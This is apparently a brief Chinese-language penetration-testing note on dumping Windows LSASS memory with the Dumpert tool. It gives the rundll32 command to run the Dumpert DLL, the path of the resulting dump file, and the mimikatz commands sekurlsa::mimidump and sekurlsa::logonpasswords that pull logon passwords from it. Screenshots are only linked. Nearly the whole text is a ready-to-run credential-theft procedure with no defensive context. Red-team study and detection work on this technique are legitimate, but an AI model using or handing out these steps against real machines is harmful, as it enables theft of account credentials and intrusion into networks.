	https://github.com/outflanknl/Dumpert
	有三种，分别是dll，可执行文件和cs的Aggressor插件，这里测试下dll和exe
	DLL的执行方式是
	rundll32.exe C:\Outflank-Dumpert.dll,Dump
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/653.png)

	文件保存在c:\windows\temp\dumpert.dmp
	用mimikatz
	>sekurlsa::mimidump c:\windows\temp\dumpert.dmp
	>sekurlsa::logonpasswords
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/654.png)

	可执行文件就直接执行就可以了
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/655.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/656.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/657.png)